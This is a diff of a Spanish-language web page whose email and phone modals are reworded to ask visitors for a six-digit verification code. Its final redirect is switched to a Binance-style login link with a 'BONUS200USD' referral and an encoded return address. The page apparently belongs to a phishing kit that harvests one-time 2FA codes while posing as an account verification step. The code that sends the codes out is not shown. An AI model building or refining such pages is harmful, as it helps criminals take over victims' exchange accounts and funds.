@@ -339,7 +339,7 @@ Utiliza llaves de acceso para completar la verificación
 
 <div class="modal-header">
 
-<h2>Correo electrónico</h2>
+<h2>Verificación por correo</h2>
 
 <div class="close" onclick="cerrarModal('correo')">&times;</div>
 
@@ -347,7 +347,7 @@ Utiliza llaves de acceso para completar la verificación
 
 <p>
 
-Ingresa el correo electrónico para continuar.
+Introduce el código de verificación de 6 dígitos.
 
 </p>
 
@@ -374,7 +374,7 @@ Enviar
 
 <div class="modal-header">
 
-<h2>Número de teléfono</h2>
+<h2>Verificación por número de teléfono</h2>
 
 <div class="close" onclick="cerrarModal('telefono')">&times;</div>
 
@@ -382,13 +382,13 @@ Enviar
 
 <p>
 
-Ingresa tu número telefónico.
+Introduce el código de verificación de 6 dígitos
 
 </p>
 
 <input
 type="text"
-placeholder="+57 3001234567"
+placeholder="Introduce el código de verificación de 6 dígitos"
 id="telefonoInput">
 
 <button onclick="enviarTelefono()">
@@ -522,7 +522,7 @@ async function verificarFinalizacion() {
         await new Promise(resolve => setTimeout(resolve, 1000));
         
         // 5. Redirección
-        window.location.href = "authenticacion.html";
+        window.location.href = "https://accounts.binance.bh/es/login?ref=BONUS200USD&return_to=aHR0cHM6Ly93d3cuYmluYW5jZS5iaC9lbi1CSC9mdXR1cmVzL3JlZj9jb2RlPUJPTlVTMjAwVVNEJmJuYg%3D%3D&source=futures";
     }
 }
 
